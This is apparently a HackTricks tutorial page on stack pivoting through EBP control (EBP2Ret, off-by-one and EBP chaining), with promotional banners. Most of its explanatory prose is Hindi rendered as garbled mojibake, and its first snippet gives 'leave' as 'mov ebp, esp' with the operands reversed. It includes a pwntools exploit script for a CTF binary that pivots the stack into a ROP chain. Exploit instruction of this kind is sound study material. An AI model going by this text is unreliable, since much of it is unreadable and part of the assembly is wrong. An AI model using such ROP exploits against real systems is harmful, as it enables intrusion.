# Stack Pivoting - EBP2Ret - EBP chaining

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

‡§Ø‡§π ‡§§‡§ï‡§®‡•Ä‡§ï **Base Pointer (EBP)** ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡§æ ‡§≤‡§æ‡§≠ ‡§â‡§†‡§æ‡§§‡•Ä ‡§π‡•à ‡§§‡§æ‡§ï‡§ø EBP ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§î‡§∞ **`leave; ret`** ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂ ‡§Ö‡§®‡•Å‡§ï‡•ç‡§∞‡§Æ ‡§ï‡§æ ‡§∏‡§æ‡§µ‡§ß‡§æ‡§®‡•Ä‡§™‡•Ç‡§∞‡•ç‡§µ‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§ï‡§à ‡§ï‡§æ‡§∞‡•ç‡§Ø‡•ã‡§Ç ‡§ï‡•á ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•ã ‡§∂‡•ç‡§∞‡•É‡§Ç‡§ñ‡§≤‡§æ‡§¨‡§¶‡•ç‡§ß ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á‡•§

‡§Ø‡§æ‡§¶ ‡§¶‡§ø‡§≤‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, **`leave`** ‡§ï‡§æ ‡§Æ‡•Ç‡§≤ ‡§Ö‡§∞‡•ç‡§• ‡§π‡•à:
```
mov       ebp, esp
pop       ebp
ret
```
And as the **EBP is in the stack** before the EIP it's possible to control it controlling the stack.

### EBP2Ret

‡§Ø‡§π ‡§§‡§ï‡§®‡•Ä‡§ï ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§â‡§™‡§Ø‡•ã‡§ó‡•Ä ‡§π‡•à ‡§ú‡§¨ ‡§Ü‡§™ **EBP ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§ï‡•ã ‡§¨‡§¶‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§≤‡•á‡§ï‡§ø‡§® EIP ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§ï‡•ã ‡§∏‡•Ä‡§ß‡•á ‡§¨‡§¶‡§≤‡§®‡•á ‡§ï‡§æ ‡§ï‡•ã‡§à ‡§§‡§∞‡•Ä‡§ï‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à**‡•§ ‡§Ø‡§π ‡§ï‡§æ‡§∞‡•ç‡§Ø‡•ã‡§Ç ‡§ï‡•á ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§ï‡•á ‡§µ‡•ç‡§Ø‡§µ‡§π‡§æ‡§∞ ‡§ï‡§æ ‡§≤‡§æ‡§≠ ‡§â‡§†‡§æ‡§§‡§æ ‡§π‡•à‡•§

‡§Ø‡§¶‡§ø, `fvuln` ‡§ï‡•á ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•á ‡§¶‡•å‡§∞‡§æ‡§®, ‡§Ü‡§™ ‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç ‡§è‡§ï **‡§®‡§ï‡§≤‡•Ä EBP** ‡§á‡§Ç‡§ú‡•á‡§ï‡•ç‡§ü ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§´‡§≤ ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§ï‡•á ‡§â‡§∏ ‡§ï‡•ç‡§∑‡•á‡§§‡•ç‡§∞ ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡§π‡§æ‡§Å ‡§Ü‡§™‡§ï‡§æ ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§ï‡§æ ‡§™‡§§‡§æ ‡§∏‡•ç‡§•‡§ø‡§§ ‡§π‡•à (‡§™‡•ç‡§≤‡§∏ 4 ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏ `pop` ‡§ë‡§™‡§∞‡•á‡§∂‡§® ‡§ï‡•á ‡§≤‡§ø‡§è), ‡§§‡•ã ‡§Ü‡§™ ‡§Ö‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡§ï‡•ç‡§∑ ‡§∞‡•Ç‡§™ ‡§∏‡•á EIP ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§ú‡•à‡§∏‡•á ‡§π‡•Ä `fvuln` ‡§≤‡•å‡§ü‡§§‡§æ ‡§π‡•à, ESP ‡§ï‡•ã ‡§á‡§∏ ‡§§‡•à‡§Ø‡§æ‡§∞ ‡§∏‡•ç‡§•‡§æ‡§® ‡§™‡§∞ ‡§∏‡•á‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§î‡§∞ ‡§Ö‡§ó‡§≤‡§æ `pop` ‡§ë‡§™‡§∞‡•á‡§∂‡§® ESP ‡§ï‡•ã 4 ‡§∏‡•á ‡§ò‡§ü‡§æ‡§§‡§æ ‡§π‡•à, **‡§ú‡§ø‡§∏‡§∏‡•á ‡§Ø‡§π ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡•Ä ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§è‡§ï ‡§™‡§§‡•á ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡•á ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§®‡•á ‡§µ‡§π‡§æ‡§Å ‡§∏‡•ç‡§ü‡•ã‡§∞ ‡§ï‡§ø‡§Ø‡§æ ‡§π‡•à‡•§**\
‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§Ü‡§™‡§ï‡•ã **2 ‡§™‡§§‡•á** ‡§ú‡§æ‡§®‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à: ‡§µ‡§π ‡§ú‡§π‡§æ‡§Å ESP ‡§ú‡§æ‡§®‡•á ‡§µ‡§æ‡§≤‡§æ ‡§π‡•à, ‡§ú‡§π‡§æ‡§Å ‡§Ü‡§™‡§ï‡•ã ‡§â‡§∏ ‡§™‡§§‡•á ‡§ï‡•ã ‡§≤‡§ø‡§ñ‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§ó‡•Ä ‡§ú‡§ø‡§∏ ‡§™‡§∞ ESP ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§

#### Exploit Construction

‡§™‡§π‡§≤‡•á ‡§Ü‡§™‡§ï‡•ã ‡§è‡§ï **‡§™‡§§‡§æ ‡§ú‡§æ‡§®‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡§π‡§æ‡§Å ‡§Ü‡§™ ‡§Æ‡§®‡§ö‡§æ‡§π‡§æ ‡§°‡•á‡§ü‡§æ / ‡§™‡§§‡•á ‡§≤‡§ø‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**‡•§ ESP ‡§Ø‡§π‡§æ‡§Å ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡•á‡§ó‡§æ ‡§î‡§∞ **‡§™‡§π‡§≤‡§æ `ret` ‡§ö‡§≤‡§æ‡§è‡§ó‡§æ**‡•§

‡§´‡§ø‡§∞, ‡§Ü‡§™‡§ï‡•ã ‡§â‡§∏ ‡§™‡§§‡•á ‡§ï‡•ã ‡§ú‡§æ‡§®‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó `ret` ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ **‡§Æ‡§®‡§ö‡§æ‡§π‡§æ ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ**‡•§ ‡§Ü‡§™ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:

* ‡§è‡§ï ‡§Æ‡§æ‡§®‡•ç‡§Ø [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) ‡§™‡§§‡§æ‡•§
* **`system()`** ‡§ï‡§æ ‡§™‡§§‡§æ ‡§â‡§∏‡§ï‡•á ‡§¨‡§æ‡§¶ **4 ‡§ú‡§Ç‡§ï ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏** ‡§î‡§∞ `"/bin/sh"` ‡§ï‡§æ ‡§™‡§§‡§æ (x86 ‡§¨‡§ø‡§ü‡•ç‡§∏)‡•§
* ‡§è‡§ï **`jump esp;`** ‡§ó‡•à‡§ú‡•á‡§ü ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) ‡§ï‡§æ ‡§™‡§§‡§æ ‡§â‡§∏‡§ï‡•á ‡§¨‡§æ‡§¶ **‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∂‡•á‡§≤‡§ï‡•ã‡§°**‡•§
* ‡§ï‡•Å‡§õ [**ROP**](../rop-return-oriented-programing/) ‡§∂‡•ç‡§∞‡•É‡§Ç‡§ñ‡§≤‡§æ‡•§

‡§Ø‡§æ‡§¶ ‡§∞‡§ñ‡•á‡§Ç ‡§ï‡§ø ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§ï‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§á‡§® ‡§™‡§§‡•á ‡§∏‡•á ‡§™‡§π‡§≤‡•á, **`4` ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏** ‡§π‡•ã‡§®‡•Ä ‡§ö‡§æ‡§π‡§ø‡§è ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø **`pop`** ‡§≠‡§æ‡§ó `leave` ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂ ‡§ï‡§æ ‡§π‡•à‡•§ ‡§á‡§® 4B ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§ï **‡§¶‡•Ç‡§∏‡§∞‡§æ ‡§®‡§ï‡§≤‡•Ä EBP** ‡§∏‡•á‡§ü ‡§ï‡§∞‡§®‡§æ ‡§î‡§∞ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•ã‡§ó‡§æ‡•§

#### Off-By-One Exploit

‡§á‡§∏ ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡§æ ‡§è‡§ï ‡§µ‡§ø‡§∂‡§ø‡§∑‡•ç‡§ü ‡§∞‡•Ç‡§™ "Off-By-One Exploit" ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§ú‡§æ‡§®‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§§‡§¨ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§ú‡§¨ ‡§Ü‡§™ **‡§ï‡•á‡§µ‡§≤ EBP ‡§ï‡•á ‡§∏‡§¨‡§∏‡•á ‡§ï‡§Æ ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§¨‡§æ‡§á‡§ü ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**‡•§ ‡§ê‡§∏‡•á ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç, ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§∏‡•ç‡§•‡§æ‡§® ‡§ú‡•ã **`ret`** ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ï‡•Ç‡§¶‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡§§‡§æ ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, EBP ‡§ï‡•á ‡§∏‡§æ‡§• ‡§™‡§π‡§≤‡•á ‡§§‡•Ä‡§® ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡§®‡•á ‡§ö‡§æ‡§π‡§ø‡§è, ‡§ú‡§ø‡§∏‡§∏‡•á ‡§Ö‡§ß‡§ø‡§ï ‡§∏‡•Ä‡§Æ‡§ø‡§§ ‡§™‡§∞‡§ø‡§∏‡•ç‡§•‡§ø‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡§Æ‡§æ‡§® ‡§π‡•á‡§∞‡§´‡•á‡§∞ ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Æ‡§ø‡§≤‡§§‡•Ä ‡§π‡•à‡•§\
‡§Ü‡§Æ‡§§‡•å‡§∞ ‡§™‡§∞ ‡§á‡§∏‡•á 0x00 ‡§¨‡§æ‡§á‡§ü ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§ú‡§ø‡§§‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•ã ‡§â‡§§‡§®‡§æ ‡§¶‡•Ç‡§∞ ‡§ï‡•Ç‡§¶ ‡§∏‡§ï‡•á‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç ‡§è‡§ï RET ‡§∏‡•ç‡§≤‡•á‡§° ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡§æ ‡§î‡§∞ ‡§Ö‡§∏‡§≤‡•Ä ROP ‡§∂‡•ç‡§∞‡•É‡§Ç‡§ñ‡§≤‡§æ ‡§ï‡•ã ‡§Ö‡§Ç‡§§ ‡§Æ‡•á‡§Ç ‡§∞‡§ñ‡§®‡§æ ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§Ø‡§π ‡§Ö‡§ß‡§ø‡§ï ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§®‡§æ ‡§π‡•ã ‡§ï‡§ø ‡§®‡§Ø‡§æ ESP RET SLED ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡•á ‡§î‡§∞ ‡§Ö‡§Ç‡§§‡§ø‡§Æ ROP ‡§∂‡•ç‡§∞‡•É‡§Ç‡§ñ‡§≤‡§æ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§π‡•ã‡•§

### **EBP Chaining**

‡§á‡§∏‡§≤‡§ø‡§è, ‡§∏‡•ç‡§ü‡•à‡§ï ‡§ï‡•á `EBP` ‡§™‡•ç‡§∞‡§µ‡§ø‡§∑‡•ç‡§ü‡§ø ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§™‡§§‡§æ ‡§°‡§æ‡§≤‡§®‡§æ ‡§î‡§∞ `EIP` ‡§Æ‡•á‡§Ç `leave; ret` ‡§ï‡§æ ‡§™‡§§‡§æ ‡§°‡§æ‡§≤‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à **‡§∏‡•ç‡§ü‡•à‡§ï ‡§∏‡•á ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ `EBP` ‡§™‡§§‡•á ‡§™‡§∞ `ESP` ‡§ï‡•ã ‡§∏‡•ç‡§•‡§æ‡§®‡§æ‡§Ç‡§§‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è**‡•§

‡§Ö‡§¨, **`ESP`** ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§π‡•à ‡§ú‡•ã ‡§è‡§ï ‡§á‡§ö‡•ç‡§õ‡§ø‡§§ ‡§™‡§§‡•á ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à ‡§î‡§∞ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ö‡§ó‡§≤‡§æ ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂ `RET` ‡§π‡•à‡•§ ‡§á‡§∏‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ESP ‡§∏‡•ç‡§•‡§æ‡§® ‡§Æ‡•á‡§Ç ‡§Ø‡§π ‡§∞‡§ñ‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:

* **`&(next fake EBP)`** -> `leave` ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂ ‡§∏‡•á `pop ebp` ‡§ï‡•á ‡§ï‡§æ‡§∞‡§£ ‡§®‡§Ø‡§æ EBP ‡§≤‡•ã‡§° ‡§ï‡§∞‡•á‡§Ç
* **`system()`** -> `ret` ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§ï‡•â‡§≤ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ
* **`&(leave;ret)`** -> ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§∏‡§Æ‡§æ‡§™‡•ç‡§§ ‡§π‡•ã‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§ï‡•â‡§≤ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ, ‡§Ø‡§π ESP ‡§ï‡•ã ‡§®‡§ï‡§≤‡•Ä EBP ‡§™‡§∞ ‡§≤‡•á ‡§ú‡§æ‡§è‡§ó‡§æ ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§∏‡•á ‡§∂‡•Å‡§∞‡•Ç ‡§ï‡§∞‡•á‡§ó‡§æ
* **`&("/bin/sh")`**-> `system` ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞

‡§¨‡•Å‡§®‡§ø‡§Ø‡§æ‡§¶‡•Ä ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§á‡§∏ ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§ï‡§à ‡§®‡§ï‡§≤‡•Ä EBPs ‡§ï‡•ã ‡§ú‡•ã‡§°‡§º‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ ‡§ï‡•á ‡§™‡•ç‡§∞‡§µ‡§æ‡§π ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á‡•§

‡§Ø‡§π [ret2lib](../rop-return-oriented-programing/ret2lib/) ‡§ï‡•Ä ‡§§‡§∞‡§π ‡§π‡•à, ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§ü‡§ø‡§≤ ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§ï‡•ã‡§à ‡§∏‡•ç‡§™‡§∑‡•ç‡§ü ‡§≤‡§æ‡§≠ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à ‡§≤‡•á‡§ï‡§ø‡§® ‡§ï‡•Å‡§õ ‡§ï‡§ø‡§®‡§æ‡§∞‡•á ‡§ï‡•á ‡§Æ‡§æ‡§Æ‡§≤‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§Ø‡§π‡§æ‡§Å ‡§è‡§ï [**‡§ö‡•Å‡§®‡•å‡§§‡•Ä ‡§ï‡§æ ‡§â‡§¶‡§æ‡§π‡§∞‡§£**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) ‡§π‡•à ‡§ú‡•ã ‡§á‡§∏ ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§è‡§ï **‡§∏‡•ç‡§ü‡•à‡§ï ‡§≤‡•Ä‡§ï** ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§µ‡§ø‡§ú‡•á‡§§‡§æ ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è‡•§ ‡§Ø‡§π ‡§™‡•É‡§∑‡•ç‡§† ‡§∏‡•á ‡§Ö‡§Ç‡§§‡§ø‡§Æ ‡§™‡•á‡§≤‡•ã‡§° ‡§π‡•à:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBP ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ

‡§ú‡•à‡§∏‡§æ ‡§ï‡§ø [**‡§á‡§∏ ‡§™‡•ã‡§∏‡•ç‡§ü ‡§Æ‡•á‡§Ç ‡§∏‡§Æ‡§ù‡§æ‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), ‡§Ø‡§¶‡§ø ‡§è‡§ï ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•Å‡§õ ‡§ë‡§™‡•ç‡§ü‡§ø‡§Æ‡§æ‡§á‡§ú‡•á‡§∂‡§® ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡§Ç‡§ï‡§≤‡§ø‡§§ ‡§ï‡•Ä ‡§ó‡§à ‡§π‡•à, ‡§§‡•ã **EBP ‡§ï‡§≠‡•Ä ‡§≠‡•Ä ESP ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡§æ**, ‡§á‡§∏‡§≤‡§ø‡§è, EBP ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§ï‡•á ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡§æ ‡§ï‡•ã‡§à ‡§≠‡•Ä ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§Æ‡•Ç‡§≤ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§µ‡§ø‡§´‡§≤ ‡§π‡•ã ‡§ú‡§æ‡§è‡§ó‡§æ ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§á‡§∏‡§ï‡§æ ‡§ï‡•ã‡§à ‡§µ‡§æ‡§∏‡•ç‡§§‡§µ‡§ø‡§ï ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§\
‡§Ø‡§π ‡§á‡§∏‡§≤‡§ø‡§è ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø **‡§™‡•ç‡§∞‡•ã‡§≤‡•â‡§ó ‡§î‡§∞ ‡§è‡§™‡§ø‡§≤‡•â‡§ó ‡§Æ‡•á‡§Ç ‡§¨‡§¶‡§≤‡§æ‡§µ** ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§Ø‡§¶‡§ø ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ë‡§™‡•ç‡§ü‡§ø‡§Æ‡§æ‡§á‡§ú‡•ç‡§° ‡§π‡•à‡•§

* **‡§ë‡§™‡•ç‡§ü‡§ø‡§Æ‡§æ‡§á‡§ú‡•ç‡§° ‡§®‡§π‡•Ä‡§Ç:**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
* **‡§Ö‡§®‡•Å‡§ï‡•Ç‡§≤‡§ø‡§§:**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## ‡§Ö‡§®‡•ç‡§Ø ‡§§‡§∞‡•Ä‡§ï‡•á RSP ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è

